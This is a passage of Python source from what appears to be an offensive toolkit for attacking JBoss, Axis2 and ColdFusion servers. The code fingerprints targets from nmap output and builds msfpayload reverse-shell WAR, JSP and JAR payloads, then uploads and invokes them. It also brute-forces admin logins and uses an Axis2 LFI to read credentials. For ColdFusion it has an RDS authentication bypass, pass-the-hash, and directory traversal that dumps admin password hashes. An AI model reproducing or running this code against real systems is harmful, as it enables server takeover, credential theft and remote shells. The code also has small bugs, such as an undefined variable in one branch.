                                cwd="./src/lib/jboss/jmxinvoke_deploy")
    except Exception, e:
        utility.Msg(e, LOG.DEBUG)
        res = str(e)

    return res


def bsh_deploy(arch, url, version, usr = None, pswd = None):
    """ Invoke the BSHDeployer
    """

    res = None
    try:
        res = check_output(["./bshdeploy.sh", url, arch, version,
                                              str(usr), str(pswd)],
                            cwd="./src/lib/jboss/bsh_deploy")
    except Exception, e:
        utility.Msg(e, LOG.DEBUG)
        res = e

    return res


def deploy_list():
    """ Simple function for dumping all deployers for supported
    platforms.  This lists them in the format INTERFACE (name), where
    name is used for matching.
    """

    for platform in state.supported_platforms:

        utility.Msg("Deployers for '%s'" % platform, LOG.UPDATE)
        load = importlib.import_module('src.platform.%s.deployers' % platform)

        # load all deployers
        modules = list(pkgutil.iter_modules(load.__path__))
        if len(modules) <= 0:
            utility.Msg("\tNo deployers found.")
            continue

        for deployer in modules:

            dp = deployer[0].find_module(deployer[1]).load_module(deployer[1])
            if 'Any' in dp.versions: dp.versions.remove("Any") # used for FP only
            utility.Msg("\t%s (%s [%s])" % (dp.title, deployer[1], '|'.join(dp.versions)))


def auxiliary_list():
    """ Lists all platform auxiliary modules
    """

    for platform in state.supported_platforms:

        utility.Msg("Auxiliarys for '%s'" % platform, LOG.UPDATE)
        load = importlib.import_module('src.platform.%s.auxiliary' % platform)

        modules = list(pkgutil.iter_modules(load.__path__))
        if len(modules) <= 0:
            utility.Msg("\tNo auxiliarys found.")
            continue

        for auxiliary in modules:
            
            try:
                aux = auxiliary[0].find_module(auxiliary[1]).load_module(auxiliary[1]).Auxiliary()
            except:
                utility.Msg("Could not load auxiliary module '%s'" % 
                                            auxiliary[1], LOG.DEBUG)

            if not aux.show:
                utility.Msg("\t%s ([%s] --%s)" % (aux.name,
                                            '|'.join(aux.versions), aux.flag))


def parse_war_path(war, include_war = False):
    """ Parse off the raw WAR name for setting its context
    """

    if '/' in war:
        war = war.rsplit('/', 1)[1]

    if include_war:
        return war
    else:
        return war.split('.')[0]


def killServe():
    """ In the event that our local server does not get
    invoked, we need to kill it tenderly
    """

    try:
        get("http://localhost:%s" % state.external_port, timeout=1.0)
    except:
        pass

########NEW FILE########
__FILENAME__ = discovery
from log import LOG
from os.path import abspath
from fingerprint import FingerEngine
import utility
import re
import pkgutil
import state

def detectFileType(inFile):
	#Check to see if file is of type gnmap
	firstLine = inFile.readline()
	secondLine = inFile.readline()
	thirdLine = inFile.readline()

	#Be polite and reset the file pointer
	inFile.seek(0)

	if (firstLine.find('nmap') != -1 and thirdLine.find('Host:') != -1):
		#Looks like a gnmap file - this wont be true for other nmap output types
		#Check to see if -sV flag was used, if not, warn
		if(firstLine.find('-sV') != -1 or firstLine.find('-A') != -1 or firstLine.find('-sSV') != -1):
			return 'gnmap'
		else:
			utility.Msg("Nmap version detection not used! Discovery module may miss some hosts!", LOG.INFO)
			return 'gnmap'
	else:
		return None

'''
Parse a gnmap file into a dictionary. The dictionary key is the ip address or hostname.
Each key item is a list of ports and whether or not that port is https/ssl. For example:
>>> targets
{'127.0.0.1': [[443, True], [8080, False]]}
'''
def parseGnmap(inFile):
	targets = {}
	for hostLine in inFile:
		currentTarget = []
		#Pull out the IP address (or hostnames) and HTTP service ports
		fields = hostLine.split(' ')
		ip = fields[1] #not going to regex match this with ip address b/c could be a hostname
		for item in fields:
			#Make sure we have an open port with an http type service on it
			if item.find('http') != -1 and re.findall('\d+/open',item):
				port = None
				https = False
				'''
				nmap has a bunch of ways to list HTTP like services, for example:
				8089/open/tcp//ssl|http
				8000/closed/tcp//http-alt///
				8008/closed/tcp//http///
				8080/closed/tcp//http-proxy//
				443/open/tcp//ssl|https?///
				8089/open/tcp//ssl|http
				Since we want to detect them all, let's just match on the word http
				and make special cases for things containing https and ssl when we
				construct the URLs.
				'''
				port = item.split('/')[0]

				if item.find('https') != -1 or item.find('ssl') != -1:
					https = True
				#Add the current service item to the currentTarget list for this host
				currentTarget.append([port,https])

		if(len(currentTarget) > 0):
			targets[ip] = currentTarget
	return targets

def doFingerprint(host, port, ssl, service):
	fpath = [abspath("./src/platform/%s/fingerprints" % service)]

	match_fps = []
	fingerprints = list(pkgutil.iter_modules(fpath))
	for fingerprint in fingerprints:
		fp = fingerprint[0].find_module(fingerprint[1]).load_module(fingerprint[1])
		fp = fp.FPrint()
		#Only try to fingerprint if we have a port match
		if fp.check(host, port):
			# set fingerprint port to match fingerengine port if defined
			match_fps.append(fp)

	return match_fps

def runDiscovery(targets,options):
	fingerengine = FingerEngine()
	fingerengine.options = options

	'''Run a fingerprint on each host/port/platform combination'''
	for host in targets:
		utility.Msg("Beginning discovery scan on host %s" % (host))
		for platform in state.supported_platforms: 
			for port in targets[host]:
				for fp in doFingerprint(host,port[0],port[1],platform):
					utility.Msg("\t%s (version %s port %s)" % (fp.title, 
                                                 fp.version, port[0]), LOG.SUCCESS)

def run(options):
	""" 
	This module takes an input file (for now, nmap gnmap output) with host IP addresses
	and ports and runs the clusterd fingerprinting engine on all HTTP/S servers
	identified. All common app server URLs will be checked for each server in order to
	attempt to identify what may be running.
	"""

	"""Read the input file, for now we only support nmap gnmap - should have been run with
	the -sV flag to detect HTTP/S servers on non-standard ports"""
	try:
		targets={}
		inFile = open(options.discovery_file,'r')
		if(detectFileType(inFile) == 'gnmap'):
			targets = parseGnmap(inFile)
		else:
			utility.Msg("Discovery input file does not appear to be in nmap gnmap format", LOG.ERROR)
			return
		inFile.close()
		runDiscovery(targets,options)
	except KeyboardInterrupt:
		pass
	except OSError:
		utility.Msg("Error loading gnmap file for discovery", LOG.ERROR)

########NEW FILE########
__FILENAME__ = generate_payload
from commands import getoutput
from log import LOG
import utility
import os
from zipfile import ZipFile

def run(options):
    """ This module is used for generating reverse shell payloads.  It's not
    flexible in what sorts of payloads it can generate, but this is by design.

    Highly customized payloads, or stuff like meterpreter/reverse java payloads
    should be generated using proper tools, such as msfpayload.  This is merely
    a quick way for us to get a reverse shell on a remote system.
    """

    PAYLOAD = "java/jsp_shell_reverse_tcp"
    SHELL = "cmd.exe"

    if not options.remote_service:
        utility.Msg("Please specify a remote service (-a)", LOG.ERROR)
        return
    elif not options.remote_os:
        utility.Msg("Please specify a remote OS (-o)", LOG.ERROR)
        return
    elif options.remote_service in ["coldfusion"]:
        out = "R > shell.jsp"
    elif options.remote_service in ["axis2"]:
        PAYLOAD = "java/meterpreter/reverse_tcp"
        out = "R > shell.jar"
    else:
        out = "W > shell.war"

    if options.remote_os != "windows":
        SHELL = "/bin/bash"

    if getoutput("which msfpayload") == "":
        utility.Msg("This option requires msfpayload", LOG.ERROR)
        return

    utility.Msg("Generating payload....")
    (lhost, lport) = options.generate_payload.split(":")

    resp = getoutput("msfpayload %s LHOST=%s LPORT=%s SHELL=%s %s" %
                    (PAYLOAD, lhost, lport, SHELL, out))

    '''For axis2 payloads, we have to add a few things to the msfpayload output'''
    if(options.remote_service in ["axis2"]):
        services_xml="""<service name="shell" scope="application">
                            <description>
                                Clusterd axis2 service
                            </description>
                            <messageReceivers>
                                <messageReceiver
                                    mep="http://www.w3.org/2004/08/wsdl/in-only"
                                    class="org.apache.axis2.rpc.receivers.RPCInOnlyMessageReceiver"/>
                                <messageReceiver
                                    mep="http://www.w3.org/2004/08/wsdl/in-out"
                                    class="org.apache.axis2.rpc.receivers.RPCMessageReceiver"/>
                            </messageReceivers>
                            <parameter name="ServiceClass">
                                metasploit.PayloadServlet
                            </parameter>
                        </service>"""

        with ZipFile('shell.jar', 'a') as shellZip:
            shellZip.write("./src/lib/axis2/PayloadServlet.class","metasploit/PayloadServlet.class")
            shellZip.writestr("META-INF/services.xml",services_xml)

    if len(resp) <= 1 or 'Created by' in resp:
        utility.Msg("Payload generated (%s).  Payload: %s" % (out.split(' ')[2], PAYLOAD))

        # also log some auxiliary information
        getoutput("echo Generated at %s > ./src/lib/shell.log" % utility.timestamp())
        getoutput("echo %s:%s >> ./src/lib/shell.log" % (lhost, lport))
        getoutput("echo %s >> ./src/lib/shell.log" % (PAYLOAD))
    else:
        utility.Msg("Error generating payload: %s" % resp, LOG.ERROR)

########NEW FILE########
__FILENAME__ = invoke_payload
from src.module.deploy_utils import parse_war_path
from time import sleep
from commands import getoutput
from log import LOG
import utility


def invoke(fingerengine, fingerprint, deployer):
    """
    """

    if fingerengine.service in ["jboss", "tomcat"]:
        return invoke_war(fingerengine, fingerprint)

    elif fingerengine.service in ["coldfusion"]:
        return invoke_cf(fingerengine, fingerprint, deployer)
    
    elif fingerengine.service in ['railo']:
        return invoke_rl(fingerengine, fingerprint, deployer)

    elif fingerengine.service in ['axis2']:
        return invoke_axis2(fingerengine, fingerprint, deployer)

    else:
        utility.Msg("Platform %s does not support --invoke" % 
                            fingerengine.options.remote_service, LOG.ERROR)

def invoke_war(fingerengine, fingerprint):
    """  Invoke a deployed WAR or JSP file on the remote server.

    This uses unzip because Python's zip module isn't very portable or
    fault tolerant; i.e. it fails to parse msfpayload-generated WARs, though
    this is a fault of metasploit, not the Python module.
    """

    dfile = fingerengine.options.deploy
    jsp = ''

    if '.war' in dfile:
        jsp = getoutput("unzip -l %s | grep jsp" % dfile).split(' ')[-1]
    elif '.jsp' in dfile:
        jsp = dfile

    if jsp == '':
        utility.Msg("Failed to find a JSP in the deployed WAR", LOG.DEBUG)
        return

    utility.Msg("Using JSP {0} from {1} to invoke".format(jsp, dfile), LOG.DEBUG)

    war_path = parse_war_path(dfile)
    try:
        # for jboss ejb/jmx invokers, we append a random integer 
        # in case multiple deploys of the same name are used
        if fingerengine.random_int:
            war_path += fingerengine.random_int
    except:
        pass

    url = "http://{0}:{1}/{2}/{3}"
    if 'random_int' in dir(fingerengine):
        # we've deployed via ejb/jmxinvokerservlet, so the path
        # will be based upon a random number
        url = url.format(fingerengine.options.ip,
                         fingerprint.port,
                         war_path + str(fingerengine.random_int),
                         jsp)
    else:
        url = url.format(fingerengine.options.ip,
                         fingerprint.port,
                         war_path,
                         jsp)

    if _invoke(url): 
        utility.Msg("{0} invoked at {1}".format(dfile, fingerengine.options.ip))
    else:
        utility.Msg("Failed to invoke {0}".format(parse_war_path(dfile, True)),
                                                  LOG.ERROR)


def invoke_cf(fingerengine, fingerprint, deployer):
    """
    """

    dfile = parse_war_path(fingerengine.options.deploy, True)

    if fingerprint.version in ["10.0"]:
        # deployments to 10 require us to trigger a 404
        url = "http://{0}:{1}/CFIDE/ad123.cfm".format(fingerengine.options.ip,
                                                      fingerprint.port)
    elif fingerprint.version in ["8.0"] and "fck_editor" in deployer.__name__:
        # invoke a shell via FCKeditor deployer
        url = "http://{0}:{1}/userfiles/file/{2}".format(fingerengine.options.ip,
                                                         fingerprint.port,
                                                         dfile)
    elif 'lfi_stager' in deployer.__name__:
        url = 'http://{0}:{1}/{2}'.format(fingerengine.options.ip, 
                                          fingerprint.port,
                                          dfile)
    else:
        url = "http://{0}:{1}/CFIDE/{2}".format(fingerengine.options.ip,
                                               fingerprint.port,
                                               dfile)

    if _invoke(url):
        utility.Msg("{0} invoked at {1}".format(dfile, fingerengine.options.ip))
    else:
        utility.Msg("Failed to invoke {0}".format(dfile), LOG.ERROR)


def invoke_rl(fingerengine, fingerprint, deployer):
    """
    """

    dfile = parse_war_path(fingerengine.options.deploy, True)
    url = 'http://{0}:{1}/{2}'.format(fingerengine.options.ip, fingerprint.port,
                                      dfile)

    if _invoke(url):
        utility.Msg("{0} invoked at {1}".format(dfile, fingerengine.options.ip))
    else:
        utility.Msg("Failed to invoke {0}".format(dfile), LOG.ERROR)
    

def invoke_axis2(fingerengine, fingerprint, deployer):
    """ Invoke an Axis2 payload
    """

    cnt = 0
    dfile = parse_war_path(fingerengine.options.deploy)
    url = 'http://{0}:{1}/axis2/services/{2}'.format(
                fingerengine.options.ip, fingerprint.port,
                dfile)

    if fingerprint.version not in ['1.6']:
        # versions < 1.6 require an explicit invocation of run
        url += '/run'

    utility.Msg("Attempting to invoke...")

    # axis2 takes a few seconds to get going, probe for 5s
    while cnt < 5:

        if _invoke(url):
            utility.Msg("{0} invoked at {1}".format(dfile, fingerengine.options.ip))
            return

        cnt += 1
        sleep(1)

    utility.Msg("Failed to invoke {0}".format(dfile), LOG.ERROR)


def _invoke(url):
    """ Make the request
    """

    status = False
    try:
        response = utility.requests_get(url)
        if response.status_code in [200, 202]:
            status = True
    except Exception, e:
        utility.Msg("Failed to invoke payload: %s" % e, LOG.ERROR)
        status = False

    return status

########NEW FILE########
__FILENAME__ = authenticate
from requests.utils import dict_from_cookiejar
from log import LOG
from sys import stdout
import state
import utility

default_credentials = [("admin", "axis2")]

def _auth(usr, pswd, url, version):
    """ Currently only auths to the admin interface
    """

    data = { 
             "userName" : usr,
             "password" : pswd,
             "submit" : "+Login+"
           }

    response = utility.requests_post(url, data=data)
    if response.status_code is 200 and not "name=\"password\"" in response.content:
        utility.Msg("Successfully authenticated with %s:%s" % (usr, pswd), LOG.DEBUG)
        return dict_from_cookiejar(response.cookies)
        

def checkAuth(ip, port, title, version):
    """
    """

    url = "http://{0}:{1}/axis2/axis2-admin/login".format(ip, port)

    if state.usr_auth:
        (usr, pswd) = state.usr_auth.split(":")
        return _auth(usr, pswd, url, version)

    # try default creds
    for (usr, pswd) in default_credentials:
        cook = _auth(usr, pswd, url, version)
        if cook:
            return cook

    # bruteforce
    if state.bf_wordlist and not state.hasbf:

        state.hasbf = True
        wordlist = []
        with open(state.bf_wordlist, 'r') as f:
            # ensure its all ascii
            wordlist = [x.decode('ascii', 'ignore').rstrip() for x in f.readlines()]

        utility.Msg("Brute forcing %s account with %d passwords..." %
                        (state.bf_user, len(wordlist)), LOG.DEBUG)

        try:
            for (idx, word) in enumerate(wordlist):
                stdout.flush()
                stdout.write("\r\033[32m [%s] Brute forcing password for %s [%d/%d]\033[0m"\
                                % (utility.timestamp(), state.bf_user,
                                   idx+1, len(wordlist)))

                cook = _auth(state.bf_user, word, url, version)
                if cook:
                    print '' # newline

                    if not (state.bf_user, word) in default_credentials:
                        default_credentials.insert(0, (state.bf_user, word))
                   
                    utility.Msg("Successful login %s:%s"
                                    (state.bf_user, word), LOG.SUCCESS)
                    return cook

            print ''

        except KeyboardInterrupt:
            pass

########NEW FILE########
__FILENAME__ = info_dump
from src.platform.axis2.authenticate import checkAuth
from auxiliary import Auxiliary
from log import LOG
from re import findall
import utility


class Auxiliary:

    def __init__(self):
        self.name = 'Dump host information'
        self.versions = ['All']
        self.show = True
        self.flag = 'ax-info'

    def check(self, fingerprint):
        return True

    def run(self, fingerengine, fingerprint):
        """ Dump information about the remote Axis2 server
        """

        utility.Msg("Attempting to retrieve Axis2 info...")

        base = "http://{0}:{1}".format(fingerengine.options.ip, fingerprint.port)
        uri = '/axis2/axis2-web/HappyAxis.jsp'

        try:
            response = utility.requests_get(base + uri)
        except Exception, e:
            utility.Msg("Failed to fetch info: %s" % e, LOG.ERROR)
            return

        if response.status_code is 200:

            data = findall("Properties</h2><pre><table(.*?)</table>", 
                                    response.content.translate(None, "\r\n\t"))
            keys = findall("<th style='border: .5px #A3BBFF solid;'>(.*?)</th>", data[0])
            values = findall("<td style='border: .5px #A3BBFF solid;'>(.*?)</td>", data[0])
            for (k,v) in zip(keys,values):
                utility.Msg("\t%s: %s" % (k, v.replace("&nbsp;", "")))

########NEW FILE########
__FILENAME__ = list_services
from src.platform.axis2.authenticate import checkAuth
from src.platform.axis2.interfaces import AINTERFACES
from auxiliary import Auxiliary
from log import LOG
from re import findall
import utility

class Auxiliary:
    """ Obtain a list of deployed services
    """

    def __init__(self):
        self.name = 'List deployed services'
        self.versions = ['Any']
        self.show = True
        self.flag = 'ax-list'

    def check(self, fingerprint):
        """
        """

        if fingerprint.title == AINTERFACES.DSR:
            return True
        return False

    def run(self, fingerengine, fingerprint):
        """
        """

        utility.Msg("Obtaining deployed services...")
        base = 'http://{0}:{1}'.format(fingerengine.options.ip,
                                       fingerprint.port)

        uri = '/axis2/axis2-admin/listService'

        cookie = checkAuth(fingerengine.options.ip, fingerprint.port,
                           fingerprint.title, fingerprint.version)
        if not cookie:
            utility.Msg("Could not get auth for %s:%s" %
                            (fingerengine.options.ip, fingerprint.port),LOG.ERROR)
            return

        response = utility.requests_get(base + uri, cookies=cookie)
        if response.status_code is 200:

           data = findall("\?wsdl\">(.*?)<", response.content)
           if len(data) > 0:
               for v in data:
                   utility.Msg("\tService found: %s" % v)
           else:
               utility.Msg("No services found.")

########NEW FILE########
__FILENAME__ = pw_lfi
from auxiliary import Auxiliary
from re import findall
from log import LOG
import utility

class Auxiliary:

    def __init__(self):
        self.name = 'Axis2 1.4.1 LFI'
        self.versions = ['1.4']
        self.show = False
        self.flag = 'ax-lfi'

    def check(self, fingerprint):
        """
        """

        if fingerprint.version in self.versions:
            return True
        return False

    def run(self, fingerengine, fingerprint):
        """ Exploits a trivial LFI in Axis2 1.4.x to grab the
        admin username and password

        http://www.exploit-db.com/exploits/12721/
        """

        utility.Msg("Attempting to retrieve admin username and password...")

        base = 'http://{0}:{1}'.format(fingerengine.options.ip, fingerprint.port)
        uri = '/axis2/services/Version?xsd=../conf/axis2.xml'

        response = utility.requests_get(base + uri)
        if response.status_code == 200:

            username = findall("userName\">(.*?)<", response.content)
            password = findall("password\">(.*?)<", response.content)
            if len(username) > 0 and len(password) > 0:
                utility.Msg("Found credentials: {0}:{1}".format(username[0], password[0]),
                                                         LOG.SUCCESS)

########NEW FILE########
__FILENAME__ = service_upload
from src.platform.axis2.interfaces import AINTERFACES
from src.platform.axis2.authenticate import checkAuth
from src.module.deploy_utils import parse_war_path
from os.path import abspath
from log import LOG
import utility


title = AINTERFACES.DSR
versions = ['1.2', '1.3', '1.4', '1.5', '1.6']
def deploy(fingerengine, fingerprint):
    """ Upload a service via the administrative interface
    """

    cookie = None
    file_path = abspath(fingerengine.options.deploy)
    file_name = parse_war_path(file_path, True)
    dip = fingerengine.options.ip

    cookie = checkAuth(dip, fingerprint.port, title, fingerprint.version)
    if not cookie:
        utility.Msg("Could not get auth to %s:%s" % (dip, fingerprint.port),
                                                    LOG.ERROR)
        return

    utility.Msg("Preparing to deploy {0}".format(file_name))

    base = 'http://{0}:{1}'.format(dip, fingerprint.port)
    uri = '/axis2/axis2-admin/upload'

    payload = {'filename' : open(file_path, 'rb')}

    response = utility.requests_post(base + uri, files=payload, cookies=cookie)
    if response.status_code is 200:
        utility.Msg("{0} deployed successfully to /axis2/services/{1}".
                                format(file_name, parse_war_path(file_path)),
                                LOG.SUCCESS)
    else:
        utility.Msg("Failed to deploy {0} (HTTP {1})".format(file_name, 
                                        response.status_code), LOG.ERROR)

########NEW FILE########
__FILENAME__ = AX12
from src.platform.axis2.interfaces import DefaultServer

class FPrint(DefaultServer):
    
    def __init__(self):
        super(FPrint, self).__init__()
        self.version = '1.2'

########NEW FILE########
__FILENAME__ = AX13
from src.platform.axis2.interfaces import DefaultServer

class FPrint(DefaultServer):
    
    def __init__(self):
        super(FPrint, self).__init__()
        self.version = '1.3'

########NEW FILE########
__FILENAME__ = AX14
from src.platform.axis2.interfaces import DefaultServer

class FPrint(DefaultServer):
    
    def __init__(self):
        super(FPrint, self).__init__()
        self.version = '1.4'

########NEW FILE########
__FILENAME__ = AX15
from src.platform.axis2.interfaces import DefaultServer

class FPrint(DefaultServer):
    
    def __init__(self):
        super(FPrint, self).__init__()
        self.version = '1.5'

########NEW FILE########
__FILENAME__ = AX16
from src.platform.axis2.interfaces import DefaultServer

class FPrint(DefaultServer):
    
    def __init__(self):
        super(FPrint, self).__init__()
        self.version = '1.6'

########NEW FILE########
__FILENAME__ = interfaces
from cprint import FingerPrint
from requests import exceptions
from re import findall
from log import LOG
import utility

class AINTERFACES:
    DSR = "Axis2 Server"


class DefaultServer(FingerPrint):
    """
    """

    def __init__(self):
        self.platform = 'axis2'
        self.version = None
        self.title = AINTERFACES.DSR
        self.uri = '/axis2/services/Version/getVersion'
        self.port = 8080
        self.hash = None

    def check(self, ip, port = None):
        """ Snags the version off the default getVersion
        method.
        """
        
        try:
            rport = self.port if port is None else port
            url = 'http://{0}:{1}{2}'.format(ip, rport, self.uri)

            response = utility.requests_get(url)
            if response.status_code is 200:

                data = findall("version is (.*?)</", 
                                    response.content.translate(None,'\n'))
                if len(data) > 0 and self.version in data[0]:
                    return True

        except exceptions.Timeout:
            utility.Msg("{0} timeout to {1}:{2}".format(self.platform, ip,
                                                rport), LOG.DEBUG)

        except exceptions.ConnectionError:
            utility.Msg("{0} connection error to {1}:{2}".format(self.platform,
                                                         ip, rport), LOG.DEBUG)

        return False

########NEW FILE########
__FILENAME__ = undeployer
from src.platform.axis2.interfaces import AINTERFACES
from src.platform.axis2.authenticate import checkAuth
from src.module.deploy_utils import parse_war_path
from log import LOG
import utility

titles = [AINTERFACES.DSR]
def undeploy(fingerengine, fingerprint):
    """ Remove a deployed service from the remote Axis2 server
    """

    if fingerprint.version not in ['1.6']:
        utility.Msg("Version %s does not support undeploying via the web interface"
                        % fingerprint.version, LOG.ERROR)
        return

    context = parse_war_path(fingerengine.options.undeploy)
    base = 'http://{0}:{1}'.format(fingerengine.options.ip, fingerprint.port)
    uri = '/axis2/axis2-admin/deleteService?serviceName={0}'.format(context)

    utility.Msg("Preparing to undeploy {0}...".format(context))

    response = utility.requests_get(base + uri)
    if "name=\"password\"" in response.content:
        utility.Msg("Host %s:%s requires auth, checking..." %
                        (fingerengine.options.ip, fingerprint.port), LOG.DEBUG)
        cookie = checkAuth(fingerengine.options.ip, fingerprint.port,
                           fingerprint.title, fingerprint.version)

        if cookie:
            response = utility.requests_get(base + uri, cookies=cookie)
        else:
            utility.Msg("Could not get auth for %s:%s" % 
                            (fingerengine.options.ip, fingerprint.port), LOG.ERROR)
            return

    if "Service doesn't exist" in response.content:
        utility.Msg("Service '%s' not found on server." % context, LOG.ERROR)
    elif 'successfully removed' in response.content: 
        utility.Msg("Successfully undeployed '%s'" % context, LOG.SUCCESS)
    else:
        utility.Msg("Failed to undeploy '%s' (HTTP %d)" % (context, response.status_code),
                                                        LOG.ERROR)

########NEW FILE########
__FILENAME__ = authenticate
from requests.auth import HTTPDigestAuth
from requests.utils import dict_from_cookiejar
from log import LOG
from sys import stdout
from hashlib import sha1
from re import findall
import hmac
import utility
import state

default_credentials = [("admin", "admin")]

def _salt(url):
    """ ColdFusion requires a salt that it uses client-side and sends
    back to the server, which it is expecting.  We can obtain the next salt
    by simply requesting it.
    """

    r = utility.requests_get(url)
    if r.status_code is 200:

        salt = findall("name=\"salt\" type=\"hidden\" value=\"(.*?)\">", r.content)
        return salt[0]


def _auth(usr, pswd, url, version):
    """ Authenticate to the remote ColdFusion server; bit of a pain 
    """

    if version in ['7.0', '8.0', '9.0']:
        salt = _salt(url) 
        hsh = hmac.new(salt, sha1(pswd).hexdigest().upper(), sha1).hexdigest().upper()
        data = {"cfadminPassword" : hsh,
                "requestedURL" : "/CFIDE/administrator/enter.cfm?",
                "cfadminUserId" : usr,
                "salt" : salt,
                "submit" : "Login"
               }

    elif version in ['10.0', '11.0']:
        
        hsh = sha1(pswd).hexdigest().upper()
        data = {'cfadminPassword' : hsh,
                'requestedURL' : '/CFIDE/administrator/enter.cfm?',
                'cfadminUserId' : usr,
                'submit' : 'Login'
               }

    try:
        res = utility.requests_post(url, data=data)
        if res.status_code is 200 and len(res.history) > 0:
            utility.Msg("Successfully authenticated with %s:%s" % (usr, pswd), LOG.DEBUG)
            return (dict_from_cookiejar(res.history[0].cookies), None)

    except Exception, e:
        utility.Msg("Error authenticating: %s" % e, LOG.ERROR)
        return (None, None)


def attemptRDS(ip, port):
    """ If version 9.x is found, we attempt to bypass authentication using
    the RDS vulnerability (CVS-2013-0632)            
    """

    utility.Msg("Attempting RDS bypass...", LOG.DEBUG)           
    url = "http://{0}:{1}".format(ip, port)
    uri = "/CFIDE/adminapi/administrator.cfc?method=login"
    data = {
             "adminpassword" : '',
             "rdsPasswordAllowed" : 1
           }

    response = utility.requests_post(url + uri, data)
    if response.status_code is 200 and "true" in response.content:
        return (dict_from_cookiejar(response.cookies), None)
    else:
        # try it with rdsPasswordAllowed = 0
        data['rdsPasswordAllowed'] = 0
        response = utility.requests_post(url + uri, data)
        if response.status_code is 200 and "true" in response.content:
            return (dict_from_cookiejar(response.cookies), None)


def attemptPTH(url, usr_auth):
    """ In vulnerable instances of CF7-9, you can use --cf-hash to obtain
    the remote server's hash and pass it.            
    """            
    
    utility.Msg("Attempting to pass the hash..", LOG.DEBUG)
    
    usr = None
    pwhsh = None
    if ':' in usr_auth:
        (usr, pwhsh) = usr_auth.split(':')
    else:
        (usr, pwhsh) = "admin", usr_auth

    salt = _salt(url) 
    hsh = hmac.new(salt, pwhsh, sha1).hexdigest().upper()
    data = {"cfadminPassword" : hsh,
            "requestedURL" : "/CFIDE/administrator/enter.cfm?",
            "cfadminUserId" : usr, 
            "salt" : salt,
            "submit" : "Login"
           }

    try:
        res = utility.requests_post(url, data=data)
        if res.status_code is 200 and len(res.history) > 0:
            utility.Msg("Sucessfully passed the hash", LOG.DEBUG)
            return (dict_from_cookiejar(res.history[0].cookies), None)
        
    except Exception, e:
        utility.Msg("Error authenticating: %s" % e, LOG.ERROR)


def checkAuth(ip, port, title, version):
    """
    """

    url = "http://{0}:{1}/CFIDE/administrator/enter.cfm".format(ip, port)

    # check with given auth
    if state.usr_auth:
        if version in ['7.0','8.0','9.0'] and len(state.usr_auth) >= 40:
            # try pth
            cook = attemptPTH(url, state.usr_auth)
            if cook:
                return cook

        if ':' in state.usr_auth:
            (usr, pswd) = state.usr_auth.split(':')
        else:
            (usr, pswd) = "admin", state.usr_auth
        return _auth(usr, pswd, url, version)

    # else try default creds
    for (usr, pswd) in default_credentials:
        cook = _auth(usr, pswd, url, version)
        if cook:
            return cook

    # if we're 9.x, we can use the RDS bypass
    if version in ["9.0"]:
        cook = attemptRDS(ip, port)
        if cook:
            return cook

    # if we're still here, check if they supplied a wordlist
    if state.bf_wordlist and not state.hasbf:

        state.hasbf = True
        wordlist = []
        try:
            with open(state.bf_wordlist, 'r') as f:
                # ensure everything is ascii or requests will explode
                wordlist = [x.decode('ascii', 'ignore').rstrip() for x in f.readlines()]
        except Exception, e:
            utility.Msg("Failed to read wordlist (%s)" % e, LOG.ERROR)
            return

        utility.Msg("Brute forcing account %s with %d passwords..." %
                                (state.bf_user, len(wordlist)), LOG.DEBUG)

        try:

            for (idx, word) in enumerate(wordlist):
                stdout.flush()
                stdout.write("\r\033[32m [%s] Brute forcing password for %s [%d/%d]\033[0m"\
                                % (utility.timestamp(), state.bf_user, idx+1,
                                   len(wordlist)))

                cook = _auth(state.bf_user, word, url, version)
                if cook:
                    print '' # newline

                    if not (state.bf_user, word) in default_credentials:
                        default_credentials.insert(0, (state.bf_user, word))

                    utility.Msg("Successful login %s:%s" %
                                        (state.bf_user, word), LOG.SUCCESS)
                    return cook

            print ''

        except KeyboardInterrupt:
            pass

########NEW FILE########
__FILENAME__ = fetch_hashes
from auxiliary import Auxiliary
from log import LOG
import utility
import re


class Auxiliary:
    """ Classic password hash retrieval in versions
    6,7,8,9, and 10.  9/10 do it a bit differently, so we use a separate
    function for that.
    """

    def __init__(self):
        self.name = 'Administrative Hash Disclosure'
        self.versions = ["6.0", "7.0", "8.0", "9.0", "10.0"]
        self.show = False
        self.flag = 'cf-hash'

    def check(self, fingerprint):
        """
        """

        if fingerprint.version in self.versions:
            return True

        return False

    def checkURL(self, fingerengine, url, keyword):
        """ Given a URL with a format in it, sub in our traversal string
        and return if we match with a keyword.                
        """

        for dots in range(7, 12):
            
            if fingerengine.options.remote_os == 'linux':
                t_url = url.format("../" * dots)
            else:
                t_url = url.format("..\\" * dots)
        
            response = utility.requests_get(t_url)
            if response.status_code == 200 and keyword in response.content:

                return response.content
                        
    def run(self, fingerengine, fingerprint):
        """
        """

        found = False                
        utility.Msg("Attempting to dump administrative hash...")

        if float(fingerprint.version) > 8.0:
            return self.run_latter(fingerengine, fingerprint)

        directories = ['/CFIDE/administrator/enter.cfm',
                       '/CFIDE/wizards/common/_logintowizard.cfm',
                       '/CFIDE/administrator/archives/index.cfm',
                       '/CFIDE/install.cfm',
                       '/CFIDE/administrator/entman/index.cfm',
                      ]

        ver_dir = { "6.0" : "CFusionMX\lib\password.properties",
                    "7.0" : "CFusionMX7\lib\password.properties",
                    "8.0" : "ColdFusion8\lib\password.properties",
                    "JRun" : "JRun4\servers\cfusion\cfusion-ear\cfusion-war"\
                             "\WEB-INF\cfusion\lib\password.properties"
                  }

        base = "http://{0}:{1}".format(fingerengine.options.ip, fingerprint.port)
        for path in directories:

            uri = ("%s?locale={0}" % path) + ver_dir[fingerprint.version] + "%00en"
            content = self.checkURL(fingerengine, base + uri, 'password=')
            if content:

                pw_hash = re.findall("password=(.*?)\r\n", content)
                rds_hash = re.findall("rdspassword=(.*?)\n", content)
                if len(pw_hash) > 0:
                    utility.Msg("Administrative hash: %s" % pw_hash[1], LOG.SUCCESS)
                    if len(rds_hash) > 0:
                        utility.Msg("RDS hash: %s" % rds_hash[1], LOG.SUCCESS)

                    found = True                        
                    break

        if not found:
            utility.Msg("Hash not found, attempting JRun..")
            for path in directories:

                uri = ("%s?locale={1}" % path) + ver_dir["JRun"] + "%00en"
                content = self.checkURL(fingerengine, base + uri, 'password=')
                if content: 

                    pw_hash = re.findall("password=(.*?)\r\n", response.content)
                    rds_hash = re.findall("rdspassword=(.*?)\n", response.content)
                    if len(pw_hash) > 0:
                        utility.Msg("Administrative hash: %s" % pw_hash[1], LOG.SUCCESS)
                        if len(rds_hash) > 0:
                            utility.Msg("RDS hash: %s" % rds_hash[1], LOG.SUCCESS)

                        break


    def run_latter(self, fingerengine, fingerprint):
        """ There's a slightly different way of doing this for 9/10, so we do that here
        """

        paths = []
